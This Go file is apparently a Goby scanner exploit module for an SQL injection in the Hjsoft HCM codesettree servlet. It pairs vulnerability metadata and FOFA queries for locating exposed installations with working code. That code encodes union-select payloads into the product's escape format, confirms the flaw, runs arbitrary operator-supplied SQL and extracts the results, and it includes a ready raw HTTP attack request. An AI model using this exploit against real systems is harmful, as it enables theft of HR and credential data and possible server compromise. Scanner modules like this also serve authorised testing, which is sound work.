package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Hjsoft HCM codesettree Interface SQL Injection Vulnerability",
    "Description": "<p>Hongjing HCM is a comprehensive human resource management software product, which aims to help enterprises improve the efficiency of human resource management and employee experience, and achieve Digital transformation of human resources</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's background password, the site's user's personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2023-06-12",
    "PostTime": "2023-07-10",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "GobyQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's background password, the site's user's personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix program, please keep an eye on the updates:<a href=\"http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1\">http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1</a></p>",
    "References": [
        "http://hjsoft.com.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "createSelect",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@VERSION",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-08743"
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "宏景人力资源信息管理系统 codesettree 接口 SQL 注入漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>宏景HCM是一款全面的人力资源管理软件产品，旨在帮助企业提高人力资源管理效率和员工体验，实现人力资源数字化转型。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1\" target=\"_blank\">http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Hjsoft HCM codesettree Interface SQL Injection Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>Hongjing HCM is a comprehensive human resource management software product, which aims to help enterprises improve the efficiency of human resource management and employee experience, and achieve Digital transformation of human resources</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's background password, the site's user's personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix program, please keep an eye on the updates:<a href=\"http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1\" target=\"_blank\">http://hjsoft.com.cn/#/product/type=01/id=2?title=%E5%AE%8F%E6%99%AFHCM&amp;target=1</a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's background password, the site's user's personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10819"
}`
	encodePayload := func(var0 string) string {
		if var0 == "" {
			return ""
		} else {
			var1 := ""
			for var2 := 0; var2 < len(var0); var2++ {
				var3 := var0[var2]
				var4 := ""
				var5 := 0
				if var3 > 255 {
					var4 = strconv.FormatInt(int64(var3), 16)
					for var5 = len(var4); var5 < 4; var5++ {
						var4 = "0" + var4
					}
					var1 += "^" + var4
				} else if var3 >= '0' && (var3 <= '/' || var3 >= 'A') && (var3 <= 'Z' || var3 >= 'a') && var3 <= 'z' {
					var1 += string(var3)
				} else {
					var4 = strconv.FormatInt(int64(var3), 16)
					for var5 = len(var4); var5 < 2; var5++ {
						var4 = "0" + var4
					}
					var1 += "~" + var4
				}
			}
			return var1
		}
	}

	sendPayload := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		uri := "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories="
		fmt.Println(hostInfo.FixedHostInfo + uri + encodePayload(sqlPayload))
		resp, err := httpclient.SimpleGet(hostInfo.FixedHostInfo + uri + encodePayload(sqlPayload))
		if err != nil || resp.StatusCode != 200 {
			return ""
		}
		return resp.Utf8Html

	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			timestamp := time.Now().Unix()
			resp := sendPayload(hostInfo, fmt.Sprintf("1' union all select 849754578,362789123+%d --", timestamp))
			num, err := strconv.Atoi("362789123")
			if err != nil {
				return false
			}
			if strings.Contains(resp, strconv.FormatInt(timestamp+int64(num), 10)) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var sql string
			if stepLogs.Params["attackType"] == "sql" {
				sql = stepLogs.Params["sql"].(string)
			} else if stepLogs.Params["attackType"] == "sqlPoint" {
				sql = fmt.Sprintf("select %d", time.Now().Unix())
			}
			resp := sendPayload(expResult.HostInfo, fmt.Sprintf("1' union all select 849754578,(%s) --", sql))
			reg, _ := regexp.Compile(` <TreeNode id="849754578" text="849754578 (.*?)" xml="`)
			results := reg.FindAllStringSubmatch(resp, 1)
			if len(results) < 1 || len(results[0]) < 2 {
				return expResult
			}
			expResult.Success = true
			if stepLogs.Params["attackType"] == "sql" {
				expResult.Output = results[0][1]
			} else if stepLogs.Params["attackType"] == "sqlPoint" {
				expResult.Output = `Payload中的特殊字符和数字需要进行URL编码，再将编码后的%符号替换成~

GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~38~34~39~37~35~34~35~37~38~2c~28select~20~40~40VERSION~29~20~2d~2d HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
`
			}
			return expResult
		},
	))
}
